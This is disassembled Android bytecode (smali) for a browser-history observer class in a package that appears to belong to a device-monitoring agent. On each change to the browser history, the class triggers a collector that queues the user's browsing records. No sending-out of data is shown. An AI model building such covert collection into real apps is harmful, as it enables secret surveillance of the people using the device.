.class public Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;
.super Lcom/hp/vd/module/ActivatableContentObserverAbstract;
.source "BrowserHistoryObserver.java"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserHistoryData;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected source:I

.field protected uri:Landroid/net/Uri;


# direct methods
.method public constructor <init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I",
            "Landroid/net/Uri;",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserHistoryData;",
            ">;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    const/4 v0, 0x0

    .line 26
    invoke-direct {p0, v0}, Lcom/hp/vd/module/ActivatableContentObserverAbstract;-><init>(Landroid/os/Handler;)V

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->context:Lcom/hp/vd/context/Context;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 28
    iput p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->source:I

    .line 29
    iput-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->uri:Landroid/net/Uri;

    .line 31
    iput-object p3, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 32
    iput-object p4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->context:Lcom/hp/vd/context/Context;

    .line 33
    iput-object p5, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 35
    iput-object p6, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public deliverSelfNotifications()Z
    .locals 1

    const/4 v0, 0x0

    return v0
.end method

.method public getSource()I
    .locals 1

    .line 80
    iget v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->source:I

    return v0
.end method

.method public getUri()Landroid/net/Uri;
    .locals 1

    .line 85
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->uri:Landroid/net/Uri;

    return-object v0
.end method

.method public onChange(Z)V
    .locals 7

    .line 52
    invoke-super {p0, p1}, Lcom/hp/vd/module/ActivatableContentObserverAbstract;->onChange(Z)V

    .line 54
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->isActivated()Z

    move-result p1

    if-nez p1, :cond_0

    return-void

    .line 58
    :cond_0
    new-instance p1, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;

    iget v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->source:I

    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->uri:Landroid/net/Uri;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->context:Lcom/hp/vd/context/Context;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v0, p1

    invoke-direct/range {v0 .. v6}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;-><init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 69
    invoke-virtual {p1}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->collect()V

    return-void
.end method
